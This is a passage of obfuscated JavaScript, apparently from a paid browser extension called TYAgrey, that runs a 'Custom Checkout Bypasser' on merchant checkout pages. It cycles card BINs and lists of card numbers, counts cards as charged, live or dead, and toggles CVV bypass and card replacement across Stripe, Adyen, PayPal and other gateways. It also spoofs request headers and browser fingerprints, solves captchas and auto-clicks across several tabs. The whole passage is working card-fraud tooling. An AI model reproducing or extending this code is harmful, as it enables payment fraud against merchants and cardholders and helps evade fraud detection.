      _0x349d07.value = _0x40ecdd.bin || "";
    }
    if (_0x25a178) {
      _0x25a178.value = _0x40ecdd.cvv || "";
    }
    if (_0x59238e) {
      _0x59238e.value = _0x40ecdd.expMonth || "";
    }
    if (_0x3cd79c) {
      _0x3cd79c.value = _0x40ecdd.expYear || "";
    }
    if (_0x562e4d) {
      _0x562e4d.value = _0x40ecdd.ccListText || "";
      _0x577b5d();
      _0x43b02c = _0x554823(_0x58c1b3(_0x40ecdd.ccListText));
    }
    _0x121606(_0x40ecdd.mode || "bin", false);
    if (_0x15f97b) {
      _0x15f97b.checked = !!_0x40ecdd.cardReplacementEnabled;
      if (_0x2f1040) {
        _0x2f1040.classList.toggle("cc-hidden", !_0x15f97b.checked);
      }
    }
    const _0x101302 = _0x40ecdd.cardReplacementGateways || _0x55f743.cardReplacementGateways;
    ["stripe", "adyen", "checkout", "recurly", "xsolla", "woocommerce", "braintree", "square", "paypal", "amex"].forEach(_0x4c98dc => {
      const _0x179166 = document.getElementById("cc-card-replacement-" + _0x4c98dc);
      if (_0x179166) {
        _0x179166.checked = !!_0x101302[_0x4c98dc];
      }
    });
    if (_0x2e34e4) {
      _0x2e34e4.checked = !!_0x40ecdd.cvvBypassEnabled;
      if (_0x4987bf) {
        _0x4987bf.classList.toggle("cc-hidden", !_0x2e34e4.checked);
      }
    }
    const _0x17dbf9 = _0x40ecdd.cvvBypassGateways || _0x55f743.cvvBypassGateways;
    ["stripe", "adyen", "checkout", "recurly", "xsolla", "woocommerce", "braintree", "square", "paypal", "amex"].forEach(_0x534c5e => {
      const _0x3ea51f = document.getElementById("cc-cvv-" + _0x534c5e);
      if (_0x3ea51f) {
        _0x3ea51f.checked = !!_0x17dbf9[_0x534c5e];
      }
    });
    if (_0x24377) {
      _0x24377.checked = !!_0x40ecdd.puaBypassEnabled;
      if (_0x59583c) {
        _0x59583c.classList.toggle("cc-hidden", !_0x24377.checked);
      }
    }
    if (_0x20ba98) {
      _0x3b0b1c();
      _0x20ba98.value = _0x40ecdd.puaCountry || "";
      _0x23a04d();
    }
    if (document.getElementById("cc-pua-enabled")) {
      document.getElementById("cc-pua-enabled").checked = _0x40ecdd.puaUserAgent !== false;
    }
    if (document.getElementById("cc-pua-referer")) {
      document.getElementById("cc-pua-referer").checked = _0x40ecdd.puaReferer !== false;
    }
    if (document.getElementById("cc-pua-accept-lang")) {
      document.getElementById("cc-pua-accept-lang").checked = _0x40ecdd.puaAcceptLang !== false;
    }
    if (document.getElementById("cc-pua-xforward")) {
      document.getElementById("cc-pua-xforward").checked = _0x40ecdd.puaXForward !== false;
    }
    if (document.getElementById("cc-pua-cf-ip")) {
      document.getElementById("cc-pua-cf-ip").checked = _0x40ecdd.puaCfIp !== false;
    }
    if (document.getElementById("cc-pua-sec-fetch")) {
      document.getElementById("cc-pua-sec-fetch").checked = _0x40ecdd.puaSecFetch !== false;
    }
    if (_0x502bf8) {
      _0x502bf8.checked = !!_0x40ecdd.stripeSecurityEnabled;
      if (_0x2cdccf) {
        _0x2cdccf.classList.toggle("cc-hidden", !_0x502bf8.checked);
      }
    }
    if (_0x5e5c39) {
      _0x5e5c39.checked = !!_0x40ecdd.threeDsEnabled;
      if (_0x22a726) {
        _0x22a726.classList.toggle("cc-hidden", !_0x5e5c39.checked);
      }
    }
    if (_0x3db678) {
      _0x3db678.checked = !!_0x40ecdd.antiDetectEnabled;
      if (_0x3b5668) {
        _0x3b5668.classList.toggle("cc-hidden", !_0x3db678.checked);
      }
    }
    ["webgl", "audio", "timezone", "locale", "canvas", "battery", "memory", "plugins"].forEach(_0x28b6ef => {
      const _0x2d491f = document.getElementById("cc-ad-" + _0x28b6ef);
      if (_0x2d491f) {
        _0x2d491f.checked = _0x40ecdd["antiDetect" + (_0x28b6ef.charAt(0).toUpperCase() + _0x28b6ef.slice(1))] !== false;
      }
    });
    if (_0x547da7) {
      _0x547da7.checked = !!_0x40ecdd.captchaSolverEnabled;
      if (_0x577ebe) {
        _0x577ebe.classList.toggle("cc-hidden", !_0x547da7.checked);
      }
    }
    if (document.getElementById("cc-captcha-recaptcha")) {
      document.getElementById("cc-captcha-recaptcha").checked = _0x40ecdd.captchaRecaptcha !== false;
    }
    if (document.getElementById("cc-captcha-hcaptcha")) {
      document.getElementById("cc-captcha-hcaptcha").checked = _0x40ecdd.captchaHcaptcha !== false;
    }
    if (_0x446327) {
      _0x446327.checked = !!_0x40ecdd.autoClickerEnabled;
      if (_0x265e55) {
        _0x265e55.classList.toggle("cc-hidden", !_0x446327.checked);
      }
    }
    if (_0xd615a) {
      _0xd615a.value = _0x40ecdd.autoClickerInterval || 500;
    }
    if (_0x347b52) {
      _0x347b52.value = _0x40ecdd.autoClickerSelector || "";
    }
    const _0x5e0ebf = ["pasted", "timing", "tracking", "zip"];
    _0x5e0ebf.forEach(_0x1024eb => {
      const _0x5d4627 = document.getElementById("cc-security-" + _0x1024eb);
      if (_0x5d4627) {
        _0x5d4627.checked = _0x40ecdd["security" + (_0x1024eb.charAt(0).toUpperCase() + _0x1024eb.slice(1))] !== false;
      }
    });
    _0x1c671e = !!_0x40ecdd.started;
    _0x1afab3(_0x1c671e);
    _0x56de8c();
    _0x54462b();
    return _0x40ecdd;
  }
  async function _0x52b61d() {
    const _0x3b50dd = {};
    ["stripe", "adyen", "checkout", "recurly", "xsolla", "woocommerce", "braintree", "square", "paypal", "amex"].forEach(_0x13f6c5 => {
      const _0x26653f = document.getElementById("cc-card-replacement-" + _0x13f6c5);
      _0x3b50dd[_0x13f6c5] = _0x26653f ? _0x26653f.checked : true;
    });
    const _0x2c6f4a = {};
    ["stripe", "adyen", "checkout", "recurly", "xsolla", "woocommerce", "braintree", "square", "paypal", "amex"].forEach(_0x28a1e8 => {
      const _0x1d09b1 = document.getElementById("cc-cvv-" + _0x28a1e8);
      _0x2c6f4a[_0x28a1e8] = _0x1d09b1 ? _0x1d09b1.checked : true;
    });
    if (_0x5efb32 === "pro") {
      _0x3b50dd.xsolla = false;
      _0x3b50dd.woocommerce = false;
      _0x3b50dd.braintree = false;
      _0x3b50dd.square = false;
      _0x3b50dd.paypal = false;
      _0x3b50dd.amex = false;
      _0x2c6f4a.xsolla = false;
      _0x2c6f4a.woocommerce = false;
      _0x2c6f4a.braintree = false;
      _0x2c6f4a.square = false;
      _0x2c6f4a.paypal = false;
      _0x2c6f4a.amex = false;
    }
    const _0x62da49 = {
      bin: _0x349d07 ? _0x349d07.value : "",
      cvv: _0x25a178 ? _0x25a178.value : "",
      expMonth: _0x59238e ? _0x59238e.value : "",
      expYear: _0x3cd79c ? _0x3cd79c.value : "",
      ccListText: _0x562e4d ? _0x562e4d.value : "",
      mode: _0x5ef1f9 && _0x5ef1f9.classList.contains("active") ? "bin" : "ccList",
      cardReplacementEnabled: _0x15f97b ? _0x15f97b.checked : false,
      cardReplacementGateways: _0x3b50dd,
      cvvBypassEnabled: _0x2e34e4 ? _0x2e34e4.checked : false,
      cvvBypassGateways: _0x2c6f4a,
      puaBypassEnabled: _0x5efb32 === "pro" ? false : _0x24377 ? _0x24377.checked : false,
      puaCountry: _0x20ba98 ? _0x20ba98.value : "",
      puaUserAgent: document.getElementById("cc-pua-enabled") ? document.getElementById("cc-pua-enabled").checked : true,
      puaReferer: document.getElementById("cc-pua-referer") ? document.getElementById("cc-pua-referer").checked : true,
      puaAcceptLang: document.getElementById("cc-pua-accept-lang") ? document.getElementById("cc-pua-accept-lang").checked : true,
      puaXForward: document.getElementById("cc-pua-xforward") ? document.getElementById("cc-pua-xforward").checked : true,
      puaCfIp: document.getElementById("cc-pua-cf-ip") ? document.getElementById("cc-pua-cf-ip").checked : true,
      puaSecFetch: document.getElementById("cc-pua-sec-fetch") ? document.getElementById("cc-pua-sec-fetch").checked : true,
      stripeSecurityEnabled: _0x502bf8 ? _0x502bf8.checked : false,
      threeDsEnabled: _0x5e5c39 ? _0x5e5c39.checked : false,
      securityPasted: document.getElementById("cc-security-pasted") ? document.getElementById("cc-security-pasted").checked : true,
      securityTiming: document.getElementById("cc-security-timing") ? document.getElementById("cc-security-timing").checked : false,
      securityTracking: document.getElementById("cc-security-tracking") ? document.getElementById("cc-security-tracking").checked : true,
      securityZip: document.getElementById("cc-security-zip") ? document.getElementById("cc-security-zip").checked : true,
      antiDetectEnabled: _0x3db678 ? _0x3db678.checked : false,
      antiDetectWebGL: document.getElementById("cc-ad-webgl") ? document.getElementById("cc-ad-webgl").checked : true,
      antiDetectAudio: document.getElementById("cc-ad-audio") ? document.getElementById("cc-ad-audio").checked : true,
      antiDetectTimezone: document.getElementById("cc-ad-timezone") ? document.getElementById("cc-ad-timezone").checked : true,
      antiDetectLocale: document.getElementById("cc-ad-locale") ? document.getElementById("cc-ad-locale").checked : true,
      antiDetectCanvas: document.getElementById("cc-ad-canvas") ? document.getElementById("cc-ad-canvas").checked : true,
      antiDetectBattery: document.getElementById("cc-ad-battery") ? document.getElementById("cc-ad-battery").checked : true,
      antiDetectMemory: document.getElementById("cc-ad-memory") ? document.getElementById("cc-ad-memory").checked : true,
      antiDetectPlugins: document.getElementById("cc-ad-plugins") ? document.getElementById("cc-ad-plugins").checked : true,
      captchaSolverEnabled: _0x547da7 ? _0x547da7.checked : false,
      captchaRecaptcha: document.getElementById("cc-captcha-recaptcha") ? document.getElementById("cc-captcha-recaptcha").checked : true,
      captchaHcaptcha: document.getElementById("cc-captcha-hcaptcha") ? document.getElementById("cc-captcha-hcaptcha").checked : true,
      autoClickerEnabled: _0x446327 ? _0x446327.checked : false,
      autoClickerInterval: _0xd615a ? parseInt(_0xd615a.value) || 500 : 500,
      autoClickerSelector: _0x347b52 ? _0x347b52.value : "",
      started: _0x1c671e
    };
    await _0x34a624({
      [_0x439922.CC_SETTINGS]: JSON.stringify(_0x62da49),
      [_0x439922.CC_LIST_DATA]: _0x62da49.ccListText,
      [_0x439922.CC_STARTED]: String(_0x1c671e),
      [_0x439922.CC_MODE]: _0x62da49.mode
    });
    localStorage.setItem("tyagrey_cc_bin", _0x62da49.bin);
    localStorage.setItem("tyagrey_cc_cvv", _0x62da49.cvv);
    localStorage.setItem("tyagrey_cc_exp_month", _0x62da49.expMonth);
    localStorage.setItem("tyagrey_cc_exp_year", _0x62da49.expYear);
    localStorage.setItem("tyagrey_cc_list", _0x62da49.ccListText);
    localStorage.setItem("tyagrey_cc_mode", _0x62da49.mode);
    localStorage.setItem("tyagrey_cc_started", String(_0x1c671e));
    if (_0x562e4d) {
      _0x43b02c = _0x554823(_0x58c1b3(_0x62da49.ccListText));
    }
    if (_0x62da49.bin && _0x62da49.bin.trim()) {
      const _0x51e987 = _0x62da49.bin.trim();
      try {
        const _0x133428 = localStorage.getItem(_0x439922.SAVED_BINS);
        let _0x4ae245 = [];
        if (_0x133428) {
          try {
            _0x4ae245 = JSON.parse(_0x133428);
          } catch {
            _0x4ae245 = [_0x133428];
          }
        }
        if (!Array.isArray(_0x4ae245)) {
          _0x4ae245 = _0x4ae245 ? [_0x4ae245] : [];
        }
        if (!_0x4ae245.includes(_0x51e987)) {
          _0x4ae245.unshift(_0x51e987);
          localStorage.setItem(_0x439922.SAVED_BINS, JSON.stringify(_0x4ae245.slice(0, 20)));
        }
        localStorage.setItem(_0x439922.PANEL_QUICK_BINS, JSON.stringify([_0x51e987]));
      } catch (_0x3d9795) {}
    }
    if (_0x62da49.ccListText && _0x62da49.ccListText.trim()) {
      localStorage.setItem("tyagrey_cc_list_raw", _0x62da49.ccListText);
    }
    return _0x62da49;
  }
  function _0x121606(_0x5bca1f, _0x5102e8 = true) {
    if (_0x5bca1f === "bin") {
      if (_0x5ef1f9) {
        _0x5ef1f9.classList.add("active");
      }
      if (_0x4f0a0e) {
        _0x4f0a0e.classList.remove("active");
      }
      if (_0x115f8b) {
        _0x115f8b.classList.remove("cc-hidden");
      }
      if (_0x84c001) {
        _0x84c001.classList.add("cc-hidden");
      }
    } else {
      if (_0x5ef1f9) {
        _0x5ef1f9.classList.remove("active");
      }
      if (_0x4f0a0e) {
        _0x4f0a0e.classList.add("active");
      }
      if (_0x115f8b) {
        _0x115f8b.classList.add("cc-hidden");
      }
      if (_0x84c001) {
        _0x84c001.classList.remove("cc-hidden");
      }
    }
    if (_0x5102e8) {
      _0x52b61d();
    }
  }
  function _0x45c3c0(_0x20d104, _0x5c87db) {
    if (!_0x20d104 || !_0x5c87db) {
      return;
    }
    _0x20d104.addEventListener("change", function () {
      if (this.disabled) {
        return;
      }
      _0x5c87db.classList.toggle("cc-hidden", !this.checked);
      _0x52b61d();
    });
    const _0x1aed84 = _0x20d104.closest(".section-header");
    if (_0x1aed84) {
      _0x1aed84.style.cursor = "pointer";
      _0x1aed84.addEventListener("click", function (_0x3bf0f8) {
        if (_0x3bf0f8.target === _0x20d104 || _0x20d104.contains(_0x3bf0f8.target)) {
          return;
        }
        if (_0x20d104.disabled) {
          return;
        }
        _0x20d104.checked = !_0x20d104.checked;
        _0x20d104.dispatchEvent(new Event("change", {
          bubbles: true
        }));
      });
    }
  }
  function _0x577b5d() {
    if (!_0x562e4d || !_0x2873a4) {
      return;
    }
    const _0x5b101f = _0x562e4d.value.trim();
    const _0x5bb242 = _0x58c1b3(_0x5b101f);
    const _0x171ad1 = _0x5bb242.filter(_0x12a6fc => _0xa790b6(_0x12a6fc.number)).length;
    const _0x2ffc64 = _0x5bb242.length;
    _0x2873a4.textContent = "📋 " + _0x2ffc64 + " card" + (_0x2ffc64 !== 1 ? "s" : "") + " (" + _0x171ad1 + " valid)";
  }
  function _0x172963() {
    const _0xfc563b = document.getElementById("panel-custom-checkout");
    if (_0xfc563b) {
      _0xfc563b.classList.add("cc-running");
    }
    window.ccCheckoutRunning = true;
    const _0x2e1f8d = _0xfc563b ? _0xfc563b.querySelectorAll(".cc-settings-area input, .cc-settings-area select, .cc-settings-area textarea, .cc-settings-area button") : [];
    _0x2e1f8d.forEach(_0x41668d => {
      _0x41668d.disabled = true;
    });
  }
  function _0x323cef() {
    const _0x2315c5 = document.getElementById("panel-custom-checkout");
    if (_0x2315c5) {
      _0x2315c5.classList.remove("cc-running");
    }
    window.ccCheckoutRunning = false;
    const _0x3b767f = _0x2315c5 ? _0x2315c5.querySelectorAll(".cc-settings-area input, .cc-settings-area select, .cc-settings-area textarea, .cc-settings-area button") : [];
    _0x3b767f.forEach(_0x175d33 => {
      _0x175d33.disabled = false;
    });
  }
  function _0x1afab3(_0x397f5a) {
    if (!_0x17d499) {
      return;
    }
    if (_0x397f5a) {
      _0x17d499.textContent = "⏹ Stop";
      _0x17d499.classList.add("stop");
      _0x172963();
    } else {
      _0x17d499.textContent = "▶ Start";
      _0x17d499.classList.remove("stop");
      _0x323cef();
    }
  }
  function _0x56de8c() {
    const _0x3af426 = {
      total: 0,
      charged: 0,
      live: 0,
      dead: 0
    };
    try {
      const _0x4ceadb = localStorage.getItem("tyagrey_cc_stats");
      if (_0x4ceadb) {
        const _0x3e5e6d = JSON.parse(_0x4ceadb);
        Object.assign(_0x3af426, _0x3e5e6d);
      }
    } catch (_0x47695d) {}
    if (_0x2b73b3) {
      _0x2b73b3.textContent = _0x3af426.total;
    }
    if (_0x5464f3) {
      _0x5464f3.textContent = _0x3af426.charged;
    }
    if (_0x49aca0) {
      _0x49aca0.textContent = _0x3af426.live;
    }
    if (_0x15ba15) {
      _0x15ba15.textContent = _0x3af426.dead;
    }
  }
  function _0x52f434() {
    if (!_0x22c73a) {
      return;
    }
    const _0x57bed = _0x349d07 && _0x349d07.value.trim().length > 0;
    const _0x1c8347 = _0x562e4d && _0x562e4d.value.trim().length > 0;
    if (!_0x57bed && !_0x1c8347) {
      _0x22c73a.classList.remove("cc-hidden");
    } else {
      _0x22c73a.classList.add("cc-hidden");
    }
  }
  function _0x3ff9f8(_0x38f52c, _0xb063ea = "info") {
    let _0x2d2287 = document.getElementById("cc-toast-notification");
    if (!_0x2d2287) {
      _0x2d2287 = document.createElement("div");
      _0x2d2287.id = "cc-toast-notification";
      _0x2d2287.style.cssText = "position:fixed;bottom:16px;left:50%;transform:translateX(-50%);padding:10px 20px;border-radius:10px;font-size:12px;font-weight:600;z-index:9999;transition:opacity 0.3s;opacity:0;";
      document.body.appendChild(_0x2d2287);
    }
    const _0x102ce5 = {
      info: "background:#76C8FF;color:#fff;",
      success: "background:#44ACFF;color:#fff;",
      error: "background:#e07070;color:#fff;",
      warning: "background:#e5a84b;color:#fff;"
    };
    _0x2d2287.style.cssText += _0x102ce5[_0xb063ea] || _0x102ce5.info;
    _0x2d2287.textContent = _0x38f52c;
    _0x2d2287.style.opacity = "1";
    setTimeout(() => {
      _0x2d2287.style.opacity = "0";
    }, 3000);
  }
  if (_0x5ef1f9) {
    _0x5ef1f9.addEventListener("click", () => _0x121606("bin"));
  }
  if (_0x4f0a0e) {
    _0x4f0a0e.addEventListener("click", () => _0x121606("ccList"));
  }
  _0x45c3c0(_0x15f97b, _0x2f1040);
  _0x45c3c0(_0x2e34e4, _0x4987bf);
  _0x45c3c0(_0x24377, _0x59583c);
  _0x45c3c0(_0x502bf8, _0x2cdccf);
  _0x45c3c0(_0x5e5c39, _0x22a726);
  _0x45c3c0(_0x3db678, _0x3b5668);
  _0x45c3c0(_0x547da7, _0x577ebe);
  _0x45c3c0(_0x446327, _0x265e55);
  [_0x349d07, _0x25a178, _0x59238e, _0x3cd79c].forEach(_0x56a2a3 => {
    if (_0x56a2a3) {
      _0x56a2a3.addEventListener("input", () => {
        _0x52b61d();
        _0x52f434();
      });
    }
  });
  if (_0x562e4d) {
    _0x562e4d.addEventListener("input", () => {
      _0x577b5d();
      _0x52b61d();
      _0x52f434();
    });
  }
  [_0x15f97b, _0x2e34e4, _0x24377, _0x502bf8, _0x5e5c39, _0x3db678, _0x547da7, _0x446327].forEach(_0x5188e8 => {
    if (_0x5188e8) {
      _0x5188e8.addEventListener("change", _0x52b61d);
    }
  });
  [_0xd615a, _0x347b52].forEach(_0x4110a2 => {
    if (_0x4110a2) {
      _0x4110a2.addEventListener("input", _0x52b61d);
    }
  });
  if (_0x20ba98) {
    _0x20ba98.addEventListener("change", async function () {
      const _0x41e79a = _0x20ba98.value;
      if (_0x41e79a) {
        await _0x405c5d(_0x41e79a);
      }
      _0x52b61d();
    });
  }
  ["cc-card-replacement-stripe", "cc-card-replacement-adyen", "cc-card-replacement-checkout", "cc-card-replacement-recurly", "cc-card-replacement-xsolla", "cc-cvv-stripe", "cc-cvv-adyen", "cc-cvv-checkout", "cc-cvv-recurly", "cc-cvv-xsolla", "cc-security-pasted", "cc-security-timing", "cc-security-tracking", "cc-security-zip", "cc-pua-enabled", "cc-pua-referer", "cc-pua-accept-lang", "cc-pua-xforward", "cc-pua-cf-ip", "cc-pua-sec-fetch", "cc-ad-webgl", "cc-ad-audio", "cc-ad-timezone", "cc-ad-locale", "cc-ad-canvas", "cc-ad-battery", "cc-ad-memory", "cc-ad-plugins", "cc-captcha-recaptcha", "cc-captcha-hcaptcha"].forEach(_0x2db664 => {
    const _0x403ded = document.getElementById(_0x2db664);
    if (_0x403ded) {
      _0x403ded.addEventListener("change", _0x52b61d);
    }
  });
  ["cc-card-replacement-xsolla", "cc-cvv-xsolla"].forEach(_0x3b2970 => {
    const _0x22fceb = document.getElementById(_0x3b2970);
    if (_0x22fceb) {
      _0x22fceb.addEventListener("click", function (_0x3dcb1a) {
        if (_0x5efb32 === "pro") {
          _0x3dcb1a.preventDefault();
          _0x3ff9f8("This gateway requires Pro+ or higher. Upgrade to unlock.", "error");
        }
      });
    }
  });
  if (_0x24377) {
    _0x24377.addEventListener("click", function (_0x3f2bb9) {
      if (_0x5efb32 === "pro") {
        _0x3f2bb9.preventDefault();
        _0x3ff9f8("Payment User Agent Bypass requires Pro+ or higher. Upgrade to unlock.", "error");
      }
    });
  }
  if (_0x3db678) {
    _0x3db678.addEventListener("click", function (_0x5367bc) {
      if (_0x5efb32 === "pro") {
        _0x5367bc.preventDefault();
        _0x3ff9f8("Anti-Detect requires Pro+ or higher. Upgrade to unlock.", "error");
      }
    });
  }
  function _0x20faee(_0x1d61c9) {
    if (_0x356e69) {
      const _0x181ad4 = _0x356e69.querySelector(".cc-stop-loading-text");
      if (_0x181ad4 && _0x1d61c9) {
        _0x181ad4.textContent = _0x1d61c9;
      }
      _0x356e69.classList.add("active");
    }
  }
  function _0x3c049c() {
    if (_0x356e69) {
      _0x356e69.classList.remove("active");
    }
  }
  if (_0x51c2ca) {
    _0x51c2ca.addEventListener("click", async function () {
      _0x20faee("Stopping & Reloading...");
      await _0x5807f9();
      _0x3c049c();
    });
  }
  async function _0x5625c7() {
    const _0x499b51 = await _0x52b61d();
    const _0x1311be = _0x499b51.bin ? _0x499b51.bin.trim() : "";
    const _0x3ca2f6 = _0x499b51.ccListText ? _0x499b51.ccListText.trim() : "";
    if (!_0x1311be && !_0x3ca2f6) {
      _0x3ff9f8("Please enter a BIN or CC List before starting.", "error");
      return false;
    }
    if (_0x499b51.mode === "bin") {
      if (!_0x499b51.bin && _0x349d07) {
        _0x349d07.value = "4242424242424242";
      }
      if (!_0x499b51.cvv && _0x25a178) {
        _0x25a178.value = "RND";
      }
      if (!_0x499b51.expMonth && _0x59238e) {
        _0x59238e.value = "RND";
      }
      if (!_0x499b51.expYear && _0x3cd79c) {
        _0x3cd79c.value = "RND";
      }
      await _0x52b61d();
    }
    if (_0x499b51.antiDetectEnabled) {
      await _0xb50b3e("APPLY_ANTI_DETECT", {
        enabled: true,
        webGL: _0x499b51.antiDetectWebGL,
        audio: _0x499b51.antiDetectAudio,
        timezone: _0x499b51.antiDetectTimezone,
        locale: _0x499b51.antiDetectLocale,
        canvas: _0x499b51.antiDetectCanvas,
        battery: _0x499b51.antiDetectBattery,
        memory: _0x499b51.antiDetectMemory,
        plugins: _0x499b51.antiDetectPlugins
      });
    }
    if (_0x499b51.captchaSolverEnabled) {
      await _0xb50b3e("APPLY_CAPTCHA_SOLVER", {
        recaptcha: _0x499b51.captchaRecaptcha,
        hcaptcha: _0x499b51.captchaHcaptcha
      });
    }
    if (_0x499b51.autoClickerEnabled) {
      await _0xb50b3e("APPLY_AUTO_CLICKER", {
        enabled: true,
        intervalMs: _0x499b51.autoClickerInterval,
        selector: _0x499b51.autoClickerSelector
      });
    }
    const _0x1382be = await _0xb50b3e("CUSTOM_CHECKOUT_START", {
      settings: _0x499b51,
      bin: _0x1311be,
      ccList: _0x3ca2f6,
      mode: _0x499b51.mode
    });
    if (_0x1382be && _0x1382be.success) {
      _0x1c671e = true;
      localStorage.setItem("tyagrey_cc_started", "true");
      await _0x34a624({
        [_0x439922.CC_STARTED]: "true"
      });
      _0x1afab3(true);
      _0x3ff9f8("Custom Checkout Bypasser started!", "success");
      console.log("[TYAgrey][CustomCheckout] Started with settings:", _0x499b51);
      return true;
    } else {
      _0x3ff9f8(_0x1382be.error || "Failed to start. Is a checkout page open?", "error");
      return false;
    }
  }
  async function _0x5807f9() {
    _0x1c671e = false;
    localStorage.setItem("tyagrey_cc_started", "false");
    await _0x34a624({
      [_0x439922.CC_STARTED]: "false",
      tyagrey_autosubmit_active: "false"
    });
    const _0x42e57b = await _0xb50b3e("CUSTOM_CHECKOUT_STOP", {});
    _0x1afab3(false);
    _0x3ff9f8("Custom Checkout Bypasser stopped.", "info");
    console.log("[TYAgrey][CustomCheckout] Stopped");
    return true;
  }
  let _0x3627b2 = [];
  let _0x19a3bd = new Set();
  let _0x2fcee2 = false;
  const _0x2efea1 = {};
  let _0x3f62ec = null;
  let _0x3e2498 = 0;
  async function _0x239302() {
    if (_0x19a3bd.size === 0) {
      _0x3ff9f8("Please select at least one tab", "error");
      return false;
    }
    const _0x29b3fb = await _0x52b61d();
    const _0x4de926 = _0x29b3fb.bin ? _0x29b3fb.bin.trim() : "";
    const _0x2e9985 = _0x29b3fb.ccListText ? _0x29b3fb.ccListText.trim() : "";
    if (_0x19a3bd.size === 1) {
      const _0x237410 = Array.from(_0x19a3bd)[0];
      const _0x51871a = (_0x2efea1[_0x237410] || "").trim();
      const _0x5614ca = _0x51871a;
      if (!_0x5614ca && !_0x2e9985) {
        _0x3ff9f8("Please enter a BIN for the selected tab before starting.", "error");
        return false;
      }
      const _0x42a84d = await new Promise(_0x294bb3 => {
        chrome.runtime.sendMessage({
          type: "START_MULTI_TAB_CHECKOUT",
          tabIds: [_0x237410],
          settings: _0x29b3fb,
          bin: _0x5614ca,
          tabBins: {
            [_0x237410]: _0x5614ca
          },
          ccList: _0x2e9985,
          mode: _0x29b3fb.mode
        }, _0x294bb3);
      });
      if (_0x42a84d && _0x42a84d.success) {
        _0x2fcee2 = true;
        await _0x34a624({
          tyagrey_autosubmit_active: "true"
        });
        _0x3ff9f8("Started on selected tab!", "success");
        return true;
      } else {
        _0x3ff9f8(_0x42a84d?.error || "Failed to start on selected tab", "error");
        return false;
      }
    }
    let _0x42cb78 = 0;
    const _0x2cda13 = {};
    for (const _0x4411a7 of _0x19a3bd) {
      const _0x367eec = (_0x2efea1[_0x4411a7] || "").trim();
      if (_0x367eec) {
        _0x2cda13[_0x4411a7] = _0x367eec;
      } else if (_0x4de926) {
        _0x2cda13[_0x4411a7] = _0x4de926;
      } else {
        _0x42cb78++;
      }
    }
    if (_0x42cb78 > 0) {
      _0x3ff9f8("Please enter a global BIN or per-tab BIN for all selected tabs (" + _0x42cb78 + " missing)", "error");
      return false;
    }
    const _0x308ef8 = await new Promise(_0x56008d => {
      chrome.runtime.sendMessage({
        type: "START_MULTI_TAB_CHECKOUT",
        tabIds: Array.from(_0x19a3bd),
        settings: _0x29b3fb,
        bin: "",
        tabBins: _0x2cda13,
        ccList: "",
        mode: "bin"
      }, _0x56008d);
    });
    if (_0x308ef8 && _0x308ef8.success) {
      const _0x404b25 = Array.isArray(_0x308ef8.results) ? _0x308ef8.results : [];
      const _0xa45682 = _0x404b25.filter(_0x5d35bc => _0x5d35bc.success).length;
      _0x2fcee2 = true;
      await _0x34a624({
        tyagrey_autosubmit_active: "true"
      });
      _0x3ff9f8("Started on " + _0xa45682 + "/" + _0x19a3bd.size + " tab(s)!", "success");
      return true;
    } else {
      _0x3ff9f8(_0x308ef8?.error || "Failed to start on selected tabs", "error");
      return false;
    }
  }
  async function _0x31f319() {
    const _0x3598cf = Array.from(_0x19a3bd).map(_0x4c4ea8 => {
      return new Promise(_0x3622c9 => {
        chrome.runtime.sendMessage({
          type: "CUSTOM_CHECKOUT_STOP",
          tabIds: [_0x4c4ea8]
        }, _0x279688 => _0x3622c9(_0x279688 || {
          success: true
        }));
      }).catch(() => ({
        success: false
      }));
    });
    await Promise.all(_0x3598cf);
    _0x2fcee2 = false;
    await _0x34a624({
      tyagrey_autosubmit_active: "false"
    });
    _0x3ff9f8("Stopped on all selected tabs", "info");
  }
  async function _0x36578b() {
    _0x20faee("Stopping checkout...");
    try {
      const _0x141b6b = Promise.all([_0x5807f9(), _0x2fcee2 ? _0x31f319() : Promise.resolve()]);
      const _0x233231 = new Promise((_0x1aa618, _0x4db322) => setTimeout(() => _0x4db322(new Error("Stop timeout")), 5000));
      await Promise.race([_0x141b6b, _0x233231]);
    } catch (_0x3e13fe) {
      console.log("[TYAgrey][CustomCheckout] Stop timed out or failed:", _0x3e13fe);
    }
    _0x1afab3(false);
    await new Promise(_0x1e6f6 => setTimeout(_0x1e6f6, 800));
    _0x3c049c();
    _0x323cef();
    _0x3ff9f8("Checkout stopped successfully", "success");
  }
  if (_0x17d499) {
    _0x17d499.addEventListener("click", async function () {
      const _0x4e8caa = this.classList.contains("stop");
      console.log("[TYAgrey][CustomCheckout] Start button clicked, isStarted:", _0x4e8caa);
      if (!_0x4e8caa) {
        _0x17d499.disabled = true;
        try {
          if (_0x19a3bd.size > 0) {
            console.log("[TYAgrey][CustomCheckout] Starting multi-tab checkout on", _0x19a3bd.size, "tabs");
            const _0xba01c3 = await _0x239302();
            console.log("[TYAgrey][CustomCheckout] Multi-tab result:", _0xba01c3);
            if (_0xba01c3) {
              _0x1afab3(true);
            }
          } else {
            _0x3ff9f8("Auto-scanning for checkout tabs...", "info");
            const _0x4e7b0e = await _0x277bb1();
            console.log("[TYAgrey][CustomCheckout] Scan result:", _0x4e7b0e);
            if (_0x4e7b0e.success && _0x4e7b0e.tabs.length > 0) {
              const _0x277591 = _0x4e7b0e.tabs[_0x4e7b0e.tabs.length - 1];
              _0x3a52f3(_0x4e7b0e.tabs);
              const _0x553a15 = await _0x52b61d();
              if (_0x553a15.bin) {
                _0x2efea1[_0x277591.id] = _0x553a15.bin.trim();
              }
              _0x19a3bd.add(_0x277591.id);
              const _0x1eded1 = document.querySelector(".cc-tab-item[data-tab-id=\"" + _0x277591.id + "\"]");
              if (_0x1eded1) {
                _0x1eded1.classList.add("selected");
                const _0x488234 = _0x1eded1.querySelector("input[type=\"checkbox\"]");
                if (_0x488234) {
                  _0x488234.checked = true;
                }
                const _0x4d551c = _0x1eded1.querySelector(".cc-tab-bin");
                if (_0x4d551c && _0x553a15.bin) {
                  _0x4d551c.value = _0x553a15.bin.trim();
                }
              }
              _0x3ff9f8("Auto-selected: " + (_0x277591.title || _0x277591.url), "success");
              const _0x9b05c3 = await _0x239302();
              console.log("[TYAgrey][CustomCheckout] Multi-tab after auto-select result:", _0x9b05c3);
              if (_0x9b05c3) {
                _0x1afab3(true);
              }
            } else {
              console.log("[TYAgrey][CustomCheckout] No tabs found, starting on active tab");
              const _0x3b9373 = await _0x5625c7();
              console.log("[TYAgrey][CustomCheckout] Active tab start result:", _0x3b9373);
            }
          }
        } catch (_0x1f9905) {
          console.error("[TYAgrey][CustomCheckout] Start error:", _0x1f9905);
          _0x3ff9f8("Start failed: " + (_0x1f9905.message || "Unknown error"), "error");
        } finally {
          _0x17d499.disabled = false;
        }
